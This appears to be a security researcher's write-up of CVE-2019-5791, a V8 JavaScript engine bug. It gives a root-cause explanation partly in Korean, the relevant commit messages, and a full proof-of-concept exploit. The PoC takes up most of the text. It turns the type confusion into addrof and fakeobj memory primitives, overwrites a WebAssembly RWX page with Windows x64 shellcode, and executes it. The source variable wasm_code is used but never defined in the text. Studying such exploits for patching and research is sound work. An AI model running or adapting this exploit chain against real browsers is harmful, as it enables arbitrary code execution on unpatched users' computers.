# CVE-2019-5791
* Date : January 2019
* Credit : cwhan.tunz@gmail.com (Google Project Zero)
* PoC was tested on Ubuntu 18.04 and Windows 10 without Sandbox
* Uploaded source code must be tested in ubuntu 18.04 with --allow-natives-syntax option
* On windows 10, shellcode must be changed.

## Description
A lazy-compiled function generates an interpreter code confusing smi value as a heap object. seems like it accesses a function object mutated to smi when generating a call stack.

## Root Cause

자바스크립트는 함수 외부에서 함수 내부의 변수를 참조해 closure로 반환하는 것을 가능하도록 해준다. 이러한 자유로운 특징 때문에 컴파일시에 각 함수마다 참조하는 변수가 무엇인지 확인해서 변수를 스택에 할당할 것인지 힙에 할당할 것인지 결정해야한다. 이는 자바스크립트 코드를 파싱하는 단계에서 수행한다. 아래와 같은 예제 코드에서 var foo2=foo(10)에서 foo 함수 내에 인자로 들어가는 10은 stack에 들어가는게 자연스럽지만, foo 함수가 반환하는 closure에서 참조하기 때문에 heap에 선언되어야 한다. 

```javascript
function foo(d){
  return function foo1(a){
    return a+d;
   };
}

var foo2 = foo(10);

function goo(a){
  return foo2(a);
}

```
또한 자바스크립트는 브라우저에서 끊김없이 수행되어야하기 때문에 모든 함수를 순차적으로 미리 컴파일하지 않고 함수를 잠시 저장해놓고 함수가 처음으로 호출될 때 컴파일을 진행한다. 다만 함수가 아닌 top-level scope에 짜여진 코드는 즉시 컴파일 된다. 즉, v8 엔진이 자바스크립트를 해석하고 구동하는 과정은 다음과 같다. preparser -> parser -> compile -> lazy compile. preparser는 앞서 설명했듯 각 함수가 어떤 변수를 참조하는지에 대한 정보(context)를 반환한다.

###bad commit
Following statement is about [bad commit](https://chromium.googlesource.com/v8/v8/+/7412593920eceebbbc37ef290d1e3fcb168a3c31)
```
[ignition] More accurate dead statement elision

The Ignition statement list visitor will skip the rest of the
statements in the list if it hits a jump statement (like a return
or break), as the rest of the code in the list can be considered
dead.

    return;
    dead_call(); // skipped

However, since this is at an AST node level, it does not take into
account condition shortcutting:

    if(2.2) return;
    dead_call(); // not skipped

There is also a second dead code elimination in Ignition compilation, at
the bytecode array writer level, where a bytecodes are not emitted if an
"exit" bytecode (Return, Jump, or a few others) has been written, until
the next basic block starts (i.e. a Bind).
```

###fix commit
Following statement is about [fix commit](https://chromium.googlesource.com/v8/v8/+/9439a1d2bba439af0ae98717be28050c801492c1)
```
[ast] Always visit all AST nodes, even dead nodes

We'll let the bytecode compiler and optimizing compilers deal with dead code,
rather than the ast visitors. The problem is that the visitors previously
disagreed upon what was dead. That's bad if necessary visitors omit parts of
the code that the bytecode generator will actually visit.

I did consider removing the AST nodes immediately in the parser, but that
adds overhead and actually broke code coverage. Since dead code shouldn't be
shipped to the browser anyway (and we can still omit it later in the bytecode
generator), I opted for keeping the nodes instead.
```

## PoC
```javascript
callFn = function (code) { try { code(); } catch (e) { console.log(e); } }

let proxy = new Proxy({}, {});
function run(prop, ...args) {
	let handler = {};
	const proxy = new Proxy(function(){}, handler);
	handler[prop] = (({v1 = ((v2 = (function () {
		var v3 = 0;
		var callFn = 0;
		if(a){return;}else{return;}
		(function () { v3(); });
		(function () {
			callFn = "\u0041".repeat(1024*32);
			v3 = [1.1];
			v4 = [{}].slice();
			//%DebugPrint(v3);
			//%DebugPrint(v4);
		})
		})) => (1))() }, ...args) => (1));
	Reflect[prop](proxy, ...args);
}
callFn((() => (run("construct", []))));
callFn((() => (run("prop1"))));
function test() {
	run[0x10] = 0x12121212;
	console.log(proxy.length);
  
  //repeat until it doesn't crash..
	if(proxy.length==1){
		location.reload();
		quit();
	}
	
	let convert = new ArrayBuffer(0x8);
	let f64 = new Float64Array(convert);
	let u32 = new Uint32Array(convert);

	function d2u(v) { f64[0] = v; return u32;}
	function u2d(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0];}
	function hex(d) { let val = d2u(d); return ("0x" + (val[1] * 0x100000000 + val[0]).toString(16)); }

// Windows x64 shellcode which does .. : MessageBoxA(NULL, "Hello World"); WinExec("notepad.exe");
	let shellcode = [0x488bc448, 0x89580848, 0x89701048, 0x89781855, 0x488d68a1, 0x4881ecb0, 0xc7, 0x45c77573, 0x6572c745, 0xcb33322e, 0x6466c745, 0xcf6c6cc6, 0x45d100c7, 0x45f74865, 0x6c6cc745, 0xfb6f2077, 0x6fc745ff, 0x726c6400, 0xc745d743, 0x3a5c57c7, 0x45db696e, 0x646f66c7, 0x45df7773, 0xc645e100, 0xc745e75c, 0x537973c7, 0x45eb7465, 0x6d3366c7, 0x45ef325c, 0xc645f100, 0xc745076e, 0x6f7465c7, 0x450b7061, 0x642ec745, 0xf657865, 0xe8da00, 0xba8e, 0x4e0eec48, 0x8bc8488b, 0xf8e85201, 0x488d, 0x4dc7ffd0, 0xba7ed8e2, 0x73488bcf, 0x488bd8e8, 0x3c010000, 0xba98fe8a, 0xe488bcf, 0x488bf0e8, 0x2c010000, 0xbaa8a24d, 0xbc488bcb, 0x488bf8e8, 0x1c010000, 0x4533c948, 0x8d55f745, 0x33c033c9, 0xffd0488d, 0x55d7c645, 0x1700488d, 0x4d17e859, 0x48, 0x8d55e748, 0x8d4d17e8, 0x4c000000, 0x488d5507, 0x488d4d17, 0xe83f0000, 0xba0500, 0x488d, 0x4d17ffd7, 0x33c9ffd6, 0x4c8d9c24, 0xb0000000, 0x498b5b10, 0x498b7318, 0x498b7b20, 0x498be35d, 0xc3cccccc, 0x33c03801, 0x740a48ff, 0xc1ffc080, 0x390075f6, 0xc3cccccc, 0xeb0348ff, 0xc1803900, 0x75f8482b, 0xca8a0288, 0x41148ff, 0xc284c075, 0xf4c3cccc, 0x4883ec28, 0xe8ff0000, 0x488b48, 0x184c8b51, 0x204d8bda, 0x498b4a50, 0xe8230000, 0x3d3fd6, 0xec8f7413, 0x4d8b124d, 0x85d27405, 0x4d3bd375, 0xe34883c8, 0xffeb0449, 0x8b422048, 0x83c428c3, 0x4533c941, 0x8bd1eb1b, 0x440fb7c0, 0x488d4902, 0x418d40bf, 0x83f81977, 0x44183c0, 0x20c1ca0d, 0x4103d00f, 0xb7016685, 0xc075dd8b, 0xc2c3cccc, 0x33c0eb0b, 0xfbed248, 0xffc1c1c8, 0xd03c28a, 0x1184d275, 0xefc3cccc, 0x48895c24, 0x8488974, 0x24105748, 0x83ec2048, 0x63413c45, 0x33c98bf2, 0x4c8bd144, 0x8b840888, 0x4c, 0x3c1458b, 0x5820418b, 0x581c4c03, 0xd9418b78, 0x244803d9, 0x458b4018, 0x4803f945, 0x85c0741b, 0x418b0b49, 0x3cae899, 0xffffff3b, 0xf0741e41, 0xffc14983, 0xc304453b, 0xc872e533, 0xc0488b5c, 0x2430488b, 0x74243848, 0x83c4205f, 0xc3420fb7, 0xc4f8b04, 0x8b4903c2, 0xebe3cccc, 0x65488b04, 0x25600000, 0xc30000];
  
	let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
	let f = wasm_mod.exports._Z3addii;
	
	console.log("[+] arr1[0] : "+proxy[0])
	console.log("[+] arr2[0] : "+hex(proxy[0x18]))
	arr2Map = proxy[4]
	var arr1Map = arr2Map - 0.000000000007900e-310
	console.log("[+] arr1Map : " + hex(arr1Map))
	console.log("[+] arr2Map : " + hex(arr2Map))

	//alert("success");

	let addrof = function(obj) {
		v4[0] = obj;
		return proxy[0x18];		// return arr2[0];
	}

	let fakeobj = function(addr) {
		proxy[0x18] = addr
		return v4[0]
	}

	let ab = new ArrayBuffer(0x300);
	let abAddr = addrof(ab);
	//%DebugPrint(ab);
	console.log("[+] array_buf : "+hex(abAddr));
	let wasmObj = addrof(wasm_mod) + u2d(0xe8-0x10,0);
	console.log("[+] wasm_addr : "+hex(addrof(wasmObj)))

	var fake = [ arr1Map, 0, wasmObj, u2d(0,0x8) ].slice();
	var fakeAddr = addrof(fake) - u2d(0x20,0);
	var target = fakeobj(fakeAddr);
	console.log("[+] fake_addr : " + hex(fakeAddr));

	let rwx = target[0];
	console.log("[+] rwx : " + hex(rwx));
	fake[2] = abAddr + u2d(0x10, 0);
	target[0] = rwx;

	let dv = new DataView(ab);
	for (var i = 0; i < shellcode.length; i++) {
		dv.setUint32(i*4, shellcode[i]);
	}
	//%DebugPrint(f);
	f();	
}

test();
```

## Reference

[issue 926651](https://bugs.chromium.org/p/chromium/issues/detail?id=926651)
